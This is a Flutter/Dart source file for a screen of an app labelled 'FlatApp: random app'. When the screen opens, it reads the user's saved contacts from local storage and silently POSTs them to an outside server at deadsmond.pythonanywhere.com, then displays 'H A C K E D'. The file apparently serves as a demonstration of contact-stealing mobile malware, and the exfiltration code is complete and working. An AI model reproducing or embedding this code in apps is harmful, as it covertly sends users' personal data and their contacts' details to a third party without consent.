import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;


//==============================================================================
//--------------------------- INITIALIZATION -----------------------------------
// FlatApp class object, operating algorithms and behaviour
class ContactsRoute extends StatefulWidget {
  //---------------------------- VARIABLES -------------------------------------
  @override
  _FlatAppMainState createState() => _FlatAppMainState();
}

//==============================================================================
//---------------------------- WIDGET ------------------------------------------
class _FlatAppMainState extends State<ContactsRoute> {
  //---------------------------- VARIABLES -------------------------------------
  // var to store contacts
  String _data;
  String key = 'CONTACT_SAVED';

  //---------------------------- INIT ------------------------------------------
  @override
  void initState() {
    super.initState();
    _operateContacts();
  }

  //-------------------------- FILE CONTENT ------------------------------------
  void sendRequest() async {
    var url = 'https://deadsmond.pythonanywhere.com/checkpoint';
    Map<String, String> headers = {"Content-type": "application/json"};
    String jsonBody = '{"data": "$_data"}';
    http.Response response = await http.post(url, headers: headers, body: jsonBody);
    print('Response status: ${response.statusCode}');
    print('Response body: ${response.body}');
  }

  Future<String> readShared(String key) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    if(prefs.containsKey(key)){
      //get String
      return prefs.getString(key);
    } else {
      return "no contacts loaded";
    }
  }

  void _operateContacts() async {
    // restore contacts
    _data = await readShared(key);
    sendRequest();
  }

  //---------------------------- MAIN WIDGET -----------------------------------
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('FlatApp: random app'),
        actions: <Widget>[
          new IconButton(
            icon: new Icon(Icons.close),
            onPressed: () =>
                SystemChannels.platform.invokeMethod('SystemNavigator.pop'),
          ),
        ],
      ),

      body: _data != null
          ? Text('H A C K E D' ?? '')
          : CircularProgressIndicator(),

      bottomNavigationBar: BottomNavigationBar(
          items: const <BottomNavigationBarItem>[
            BottomNavigationBarItem(
              icon: Icon(Icons.not_interested),
              title: Text('Exit'),
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.exit_to_app),
              title: Text('Load data'),
            ),
          ],
          // operate NavigationBar
          onTap: (index) {
            // operate NavigationBar
            switch (index) {
              case 0:
              // EXIT --------------------------------------------------------
              // exit app - this is preferred way
                SystemChannels.platform.invokeMethod('SystemNavigator.pop');
                break;
              case 1:
                print("Sending contact...");
                _operateContacts();
                break;
            // -----------------------------------------------------------------
            }
          }
      ),
    );
  }
}
//==============================================================================
